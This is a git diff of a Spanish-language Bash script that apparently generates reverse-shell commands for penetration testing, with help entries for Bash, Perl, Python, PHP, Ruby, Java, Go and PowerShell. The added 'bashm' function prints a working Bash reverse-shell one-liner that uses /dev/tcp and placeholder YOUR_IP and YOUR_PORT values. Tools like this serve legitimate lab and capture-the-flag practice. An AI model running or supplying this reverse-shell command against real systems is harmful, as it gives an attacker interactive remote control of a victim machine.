@@ -51,13 +51,13 @@ function Help(){
    echo -e "${green}menu${end}     Menu Interactivo."
    echo -e "${green}h${end}        Muestra este panel de ayuda."
    echo -e "${green}b${end}        Muestra reverse shells en ${green}BASH${end}."
-   echo -e "${green}p${end}     Muestra reverse shells en ${green}PERL${end}."
-   echo -e "${green}py${end}    Muestra reverse shells en ${green}PYTHON${end}."
-   echo -e "${green}php${end}   Muestra reverse shells en ${green}PHP${end}."
-   echo -e "${green}r${end}     Muestra reverse shells en ${green}RUBY${end}."
-   echo -e "${green}j${end}     Muestra reverse shells en ${green}JAVA${end}."
-   echo -e "${green}g${end}     Muestra reverse shells en ${green}GO${end}."
-   echo -e "${green}pow${end}   Muestra reverse shells en ${green}POWERSHELL${end}."
+   echo -e "${green}p${end}        Muestra reverse shells en ${green}PERL${end}."
+   echo -e "${green}py${end}       Muestra reverse shells en ${green}PYTHON${end}."
+   echo -e "${green}php${end}      Muestra reverse shells en ${green}PHP${end}."
+   echo -e "${green}r${end}        Muestra reverse shells en ${green}RUBY${end}."
+   echo -e "${green}j${end}        Muestra reverse shells en ${green}JAVA${end}."
+   echo -e "${green}g${end}        Muestra reverse shells en ${green}GO${end}."
+   echo -e "${green}pow${end}      Muestra reverse shells en ${green}POWERSHELL${end}."
    echo
 }
 
@@ -97,13 +97,19 @@ function menu(){
     
 }
 
-# FLUJO
+function bashm(){
+    clear
+    echo -e "${green}bash -i >& /dev/tcp/${red}YOUR_IP${end}/${red}YOUR_PORT${end} 0>&1${end}"
 
+}
+
+# FLUJO
 
 declare -i cont=0;
 tput civs; while getopts ":h:m:b:p:py:php:r:nc:j:g:pow:" option; do
     case $option in
         m) menu=$OPTARG && let cont+=1 ;;
+        b) bash=$OPTARG && let cont+=1 ;;
         h) Help;;
 
     esac
@@ -113,7 +119,8 @@ if [ $cont -ne 1 ]; then
     Help    
 else
     menu
-    bash
+    bashm
     tput cnorm;
 
 fi
+
